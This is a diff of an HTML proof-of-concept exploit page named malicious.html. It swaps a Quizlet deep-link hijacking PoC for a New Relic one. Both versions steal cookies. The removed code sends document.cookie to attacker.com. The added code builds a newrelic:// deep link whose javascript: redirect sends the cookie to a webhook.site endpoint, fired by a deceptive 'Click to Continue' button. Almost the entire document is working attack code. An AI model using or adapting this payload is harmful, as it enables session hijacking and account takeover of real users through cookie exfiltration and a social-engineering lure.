@@ -1,27 +1,16 @@
+<!-- malicious.html -->
 <html>
-  <head>
-    <title>Quizlet PoC</title>
-  </head>
-  <body>
-    <h1>Quizlet Deep Link Hijacking PoC</h1>
-    <p>If you see this page inside Quizlet, the vulnerability is confirmed.</p>
+<body>
     <script>
-      console.log("PoC script started...");
+        function exploit() {
+            // Create malicious deep link with parameters
+            const payload = 'newrelic://login?redirect=' +
+                encodeURIComponent('javascript:fetch("https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/steal?data="+document.cookie)');
 
-      // 1. محاولة سرقة الكوكيز وإرسالها إلى المهاجم
-      try {
-        fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
-        console.log("Attempted to exfiltrate cookies.");
-      } catch (e) {
-        console.error("Cookie exfiltration failed:", e);
-      }
-      
-      // 2. بعد 3 ثوانٍ، سيتم استغلال الرابط العميق لفتح شاشة البحث
-      setTimeout(() => {
-        console.log("Triggering deep link to open search page...");
-        // استخدام رابط حقيقي تم اكتشافه من ملف المانيفست
-        location.href = 'https://quizlet.com/create-set';
-      }, 3000);
+            // Trigger the deep link
+            window.location.href = payload;
+        }
     </script>
-  </body>
+    <button onclick="exploit()">Click to Continue</button>
+</body>
 </html>
